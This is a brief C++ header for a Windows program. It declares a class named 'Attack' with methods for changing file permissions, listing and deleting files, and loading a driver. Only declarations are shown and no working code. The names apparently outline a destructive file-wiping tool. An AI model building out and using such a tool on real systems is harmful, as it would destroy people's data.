#ifndef UNICODE
#define UNICODE
#define UNICODE_WAS_UNDEFINED
#endif

#include <Windows.h>

#ifdef UNICODE_WAS_UNDEFINED
#undef UNICODE
#endif

#include <cstring>
#include <iostream>
#include <vector>
#include <string>
#include <fstream>
#include <locale> 
#include <codecvt>
#include <tchar.h>

#include <AccCtrl.h>
#include <AclAPI.h>

using namespace std;

class Attack {
public:
	void SetFilePermission(LPCWSTR filename);
	vector<wstring> list_n_kill_files(wstring path);
	void LoadDriverBeep();
};

